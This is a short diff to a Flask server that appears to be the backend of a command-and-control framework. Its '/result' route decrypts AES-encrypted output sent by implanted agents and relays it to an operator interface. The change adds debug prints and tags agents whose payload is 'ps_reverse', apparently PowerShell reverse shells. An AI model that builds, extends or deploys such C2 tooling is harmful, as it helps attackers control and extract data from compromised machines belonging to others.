@@ -305,6 +305,7 @@ def beacon():
 
 @app.route('/result', methods=['POST'])
 def result():
+    print("📩 [RESULT RECEIVED]")
     encrypted = request.data.decode()
 
     # Use registered AES keys to try decrypting
@@ -387,7 +388,10 @@ def result():
     conn.close()
 
     # Identify PS agents
-    is_ps_agent = str(hostname).lower().startswith("ps_") or (data.get("payload") or "").startswith("ps_")
+    payload = data.get("payload", "").lower()
+    print(f"[DEBUG] Host: {hostname}, Payload: {payload}")
+    is_ps_agent = payload == "ps_reverse"
+
 
     if is_ps_agent:
         socketio.emit("ps_output", {
